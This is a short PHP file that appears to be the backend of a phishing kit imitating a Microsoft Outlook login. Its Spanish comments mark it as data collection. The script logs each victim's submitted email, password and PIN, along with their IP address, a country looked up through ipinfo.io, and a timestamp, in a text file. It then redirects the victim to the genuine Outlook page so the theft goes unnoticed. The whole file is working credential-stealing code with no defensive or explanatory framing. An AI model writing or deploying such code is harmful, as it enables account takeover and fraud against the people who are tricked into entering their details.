<?php
//obtencion de data
$userp = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
//creating txt DB 
$fi = fopen("HoP.txt", "a")
or die ("Problem writing TXT DB");
fwrite ($fi, "|----------------------------------------------------------------------------------------------------|");
fwrite ($fi, " \n ");
fwrite ($fi, "Correo: ".$_POST['ae']."    Password: ".$_POST['ao']."\n");
fwrite ($fi, "Pin :".$_POST['pn']."    IP:" .$userp."\n");
fwrite ($fi, "Fecha:".date('Y/m/d')."   Hora:".date('H:i:s')."    Pais:".$cc."\n");


$praga=rand();
$praga=md5($praga);
  header ("Location: https://outlook.live.com/owa/");
// }else{

// }

?>

